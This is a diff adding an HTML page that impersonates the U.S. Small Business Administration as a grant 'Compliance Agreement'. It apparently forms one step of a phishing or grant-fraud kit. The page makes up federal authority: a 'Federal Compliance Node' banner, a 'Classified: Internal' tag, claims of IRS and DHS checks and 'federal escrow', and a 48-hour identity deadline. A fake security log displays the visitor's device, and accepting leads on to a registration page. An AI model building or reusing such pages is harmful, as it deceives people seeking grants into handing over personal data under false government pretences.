@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBA Portal | Terms & Compliance</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
+        :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
+        body { font-family: 'Public Sans', sans-serif; background-color: #f8fafc; }
+        
+        .gov-top { background: #000; color: #fff; font-size: 8px; padding: 8px; text-align: center; font-weight: 900; letter-spacing: 2px; text-transform: uppercase; border-bottom: 3px solid #b69121; }
+        .sba-logo-box { border: 2px solid var(--sba-blue); padding: 2px 6px; display: inline-block; line-height: 1; }
+
+        .terms-card { border-radius: 4px; border-top: 6px solid var(--sba-blue); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1); }
+        .terms-text { height: 280px; overflow-y: auto; scrollbar-width: thin; }
+
+        .section-h { color: var(--sba-blue); font-weight: 900; margin-top: 20px; border-bottom: 1px solid #e2e8f0; padding-bottom: 4px; font-size: 11px; text-transform: uppercase; }
+        
+        .sig-log { 
+            background: #020617; border-radius: 4px; padding: 15px; margin-top: 20px; 
+            font-family: 'Courier New', monospace; font-size: 10px; color: #22c55e;
+            line-height: 1.5; border: 1px solid #1e293b;
+        }
+
+        .btn-sba { background-color: var(--sba-blue); transition: 0.2s; }
+        .btn-sba:disabled { opacity: 0.5; cursor: not-allowed; }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <div class="gov-top">
+        <i class="fas fa-shield-alt mr-2"></i> Federal Compliance Node: SBA-TC-2026-X
+    </div>
+
+    <main class="flex-grow flex items-center justify-center p-6">
+        <div class="w-full max-w-2xl">
+            <div class="bg-white terms-card p-8 md:p-12 border border-slate-200">
+                
+                <div class="flex justify-between items-start mb-8">
+                    <div class="flex items-center gap-3">
+                        <div class="sba-logo-box"><span class="text-xl font-black text-[#002e6d]">SBA</span></div>
+                        <div class="hidden sm:block">
+                            <p class="text-[7px] font-black text-slate-400 uppercase leading-none">U.S. Small Business</p>
+                            <p class="text-[9px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
+                        </div>
+                    </div>
+                    <span class="bg-red-100 text-red-700 px-3 py-1 rounded text-[9px] font-black border border-red-200 uppercase">Classified: Internal</span>
+                </div>
+
+                <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter mb-4">Compliance Agreement</h2>
+
+                <div class="terms-text text-[13px] text-slate-600 leading-relaxed pr-4">
+                    <div class="section-h">1.0 AUTHORIZATION</div>
+                    <p class="mt-2">The applicant provides express consent to the <b>SBA</b> to perform cross-agency data validation, including IRS and DHS records, to confirm eligibility for federal grant disbursement.</p>
+
+                    <div class="section-h">2.0 FRAUDULENT ACTIVITY</div>
+                    <p class="mt-2">Any attempt to bypass security protocols or provide falsified PII is a federal offense under <b>18 U.S.C. § 1030</b>. All access logs are recorded and mapped to IP hardware.</p>
+
+                    <div class="section-h">3.0 DISBURSEMENT</div>
+                    <p class="mt-2">Funds are held in federal escrow until <b>KYC (Know Your Customer)</b> verification is completed. Failure to provide valid identification within 48 hours results in a temporary freeze.</p>
+                </div>
+
+                <div class="mt-6 p-4 bg-slate-50 border border-slate-200 rounded flex gap-4 cursor-pointer" onclick="document.getElementById('agreeCheck').click()">
+                    <input type="checkbox" id="agreeCheck" class="w-5 h-5 mt-0.5 accent-[#002e6d]">
+                    <span class="text-[11px] font-bold text-slate-700 uppercase italic">
+                        I hereby acknowledge the federal compliance standards and verify that I am the authorized legal representative for this claim.
+                    </span>
+                </div>
+
+                <div class="sig-log">
+                    [SYSTEM_LINK_ACTIVE]<br>
+                    USER_NODE: <span id="userAgent" class="text-blue-400">LOADING...</span><br>
+                    ENCRYPTION: AES-256-GCM<br>
+                    TIMESTAMP: <span id="currentTimestamp" class="text-yellow-500">...</span>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-8">
+                    <button onclick="handleAgree()" id="agreeBtn" class="btn-sba text-white font-black py-4 rounded uppercase tracking-widest text-xs shadow-lg">
+                        Accept & Continue
+                    </button>
+                    <button onclick="window.location.href='index.html'" class="border-2 border-slate-200 text-slate-400 font-black py-4 rounded uppercase tracking-widest text-xs">
+                        Decline
+                    </button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // System Log Setup
+        const now = new Date();
+        document.getElementById('currentTimestamp').innerText = now.toISOString().replace('T', ' ').split('.')[0];
+        document.getElementById('userAgent').innerText = navigator.platform || "SECURE_DEVICE";
+
+        function handleAgree() {
+            const isChecked = document.getElementById('agreeCheck').checked;
+            if (!isChecked) {
+                alert("FEDERAL REQUIREMENT: You must acknowledge the compliance terms.");
+                return;
+            }
+            
+            const btn = document.getElementById('agreeBtn');
+            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin mr-2"></i> VERIFYING...';
+            btn.disabled = true;
+
+            setTimeout(() => {
+                window.location.href = 'register.html';
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
